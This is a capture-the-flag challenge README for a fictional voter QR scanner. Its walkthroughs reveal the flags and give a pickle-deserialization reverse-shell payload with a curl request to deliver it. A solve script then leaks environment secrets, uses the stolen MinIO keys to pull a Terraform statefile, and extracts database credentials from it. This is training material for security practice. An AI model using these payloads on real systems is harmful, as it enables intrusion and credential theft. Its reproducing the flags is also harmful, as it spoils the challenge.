# A Scanner Pwnly

**Author:** enderthenetrunner (Robert Babaev)

**Category:** Web / Cloud

## Description

Val Verde just implemented a fancy new QR code system for validating voters. Something about being easier for citizens. I don't buy that tradeoff.

See if you can't crack this thing wide open.

### Files

See `release_files`

### Host

`http://badgescan.valverde.vote:1337`

## Part 1

**CTFd name:** _A Scanner Pwnly 1 - Badges_

### CTFd Description

First order of business: Every full scale takeover starts with getting onto the machine. Find a way in.

### Depends on

N/A

### Flag

<details>
<summary>(expand to read)</summary><br>

`FLAG{democracy_in_a_pickle_f2a687abaf0305c4}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

This part involves exploiting a `pickle` RCE in the /scanner endpoint of the API, then using the generic error handling to get some output.

Once you have the RCE, you should be able to find the flag by looking through the environment variables. Easiest way to do this is using the
`/proc/self/environ` file.

```python
# Generates a base64 encoded pickle payload that creates a reverse shell to 10.10.10.2 on port 1234
import pickle
import base64


class RCE:
    def __reduce__(self):
        return (
            exec,
            (
                """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.10.2',1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
        """,
            ),
        )


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled))
```

```bash
# Run the payload
curl -v -X POST "http://api.badgescan.valverde.vote:8000/scanner/" \
    -H "Content-Type: application/json" \
    -d '{"data": "gASV9wAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIzbCmltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMC4xMC4xMC4yJywxMjM0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCiAgICAgICAglIWUUpQu"}'
```

</details>

## Part 2

**CTFd name:** _A Scanner Pwnly 2 - Environmental Awareness_

### CTFd Description

They're using a custom object storage solution to stash the QR codes. Wonder if they've got anything else we can use in there.

### Depends on

_A Scanner Pwnly 1 - Badges_

### Flag

<details>
<summary>(expand to read)</summary><br>

`FLAG{terraformidable_errors_22439f083e887544}`

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

This one might take some recon, but in the environment you should see a handful of MinIO keys. Using the installed MinIO client on the system, or by navigating to
the dashboard at `http://object-storage.badgescan.vv:9001/`, you should be able to access all of the buckets.

Notably, there is a Terraform statefile in one of the now accessible buckets. Take the file, run it through something like `jq`, and you'll see it's a snapshot
of the current state of the application infrastructure.

Contained within this snapshot is credentials to the internal database. Connect via that same RCE (it's only accessible within the network) and find the flag
in the memos table.

```python
# solve.py

import base64
import json
import pickle
from typing import Any

from httpx import AsyncClient
from minio import Minio, S3Error


class ScannerExploit:
    def __init__(self, payload: str):
        self.payload = payload

    def __reduce__(self):
        return exec, (self.payload,)

    def create_scanner_payload(self) -> str:
        return base64.b64encode(pickle.dumps(self)).decode()


async def main():
    async with AsyncClient(
        base_url="http://api.badgescan.valverde.vote:8000"
    ) as api_client:
        # Getting the environment variables

        with open("env_payload.py") as fd:
            payload = fd.read()
            exploit = ScannerExploit(payload)

        res = await api_client.post(
            "/scanner/", json={"data": exploit.create_scanner_payload()}
        )

        error = res.json()["error"].strip()

        last_error_line: str = error.split("\n")[-1]
        env_collection = last_error_line.removeprefix("RuntimeError: ").split("\x00")
        env_vars: dict[str, str] = dict()
        for env_pair in env_collection:
            env_pair = env_pair.strip()
            if not env_pair:
                continue
            name, value = env_pair.split("=")
            env_vars[name] = value

        minio_access_key = env_vars.get("MINIO_ACCESS_KEY", "")
        minio_secret_key = env_vars.get("MINIO_SECRET_KEY", "")
        minio_endpoint = env_vars.get("MINIO_ENDPOINT", "")
        flag = env_vars.get("FLAG", "")

        print(f"FLAG OBTAINED: {flag}")

        minio_client = Minio(
            minio_endpoint,
            access_key=minio_access_key,
            secret_key=minio_secret_key,
            secure=False,
        )

        buckets = minio_client.list_buckets()

        target_bucket = "terraform"

        terraform_objects = minio_client.list_objects(bucket_name=target_bucket)

        for file in terraform_objects:
            print(
                f"Object found in bucket '{target_bucket}': {file.object_name}",
            )

        target_object = "terraform.tfstate"

        file_data = minio_client.get_object(target_bucket, target_object).read()

        terraform_state = json.loads(file_data.decode())

        internal_db_hostname = ""

        for resource in terraform_state.get("resources", []):
            resource_name = resource.get("name", "Name not found")
            resource_type = resource.get("type")

            if "internal_db" not in resource_name:
                continue

            if resource.get("type") != "docker_container":
                continue

            print("Internal DB resource found:", resource_name)

            for instance in resource.get("instances"):
                attributes: dict[str, Any] = instance.get("attributes")
                env: list[str] = attributes.get("env", [])
                for env_pair in env:
                    name, value = env_pair.split("=")
                    env_vars[name] = value

                internal_db_hostname = attributes.get("hostname")

        internal_db_user = env_vars.get("POSTGRES_USER", "")
        internal_db_password = env_vars.get("POSTGRES_PASSWORD", "")
        internal_db_name = env_vars.get("POSTGRES_DB", "")

        print(
            f"{internal_db_user=}, {internal_db_name=}, {internal_db_password=}, {internal_db_hostname=}"
        )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except S3Error as e:
        print(f"MinIO error: {e}")
    except Exception as e:
        print(f"Unknown error: {e}")
```

```python
# env_payload.py

raise RuntimeError(open("/proc/self/environ").read())
```

For database exploitation, use the reverse shell code provided in the walkthrough for part 1.
The `postgresql` client can be installed via apt.

</details>

## Setup instructions

### 1. Install Docker

Easiest way to install Docker is via the convenience script:

```bash
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
```

### 2. Install OpenTofu

The challenge relies on OpenTofu for deployments.

```bash
curl --proto '=https' --tlsv1.2 -fsSL https://get.opentofu.org/install-opentofu.sh -o install-opentofu.sh
chmod +x install-opentofu.sh
./install-opentofu.sh --install-method deb
rm -f install-opentofu.sh
```

### 3. Install jq

If it's not already installed, run:

```bash
sudo apt install jq
```

### 4. Run the Script

This might take a while! (And, depending on your setup, explicit sudo permissions.)

```bash
./scripts/deploy.sh
```
